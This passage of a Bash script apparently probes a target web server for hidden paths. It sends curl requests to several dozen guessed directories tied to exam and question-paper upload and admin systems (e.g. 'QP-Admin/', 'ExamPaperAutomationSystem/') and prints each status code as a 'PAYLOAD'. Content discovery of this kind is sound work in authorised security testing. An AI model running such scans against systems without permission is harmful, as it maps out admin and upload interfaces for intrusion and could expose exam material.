payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperAutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperAutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ServiceQPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ServiceQPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagementQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagementQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ToolQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ToolQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Service-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Service-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

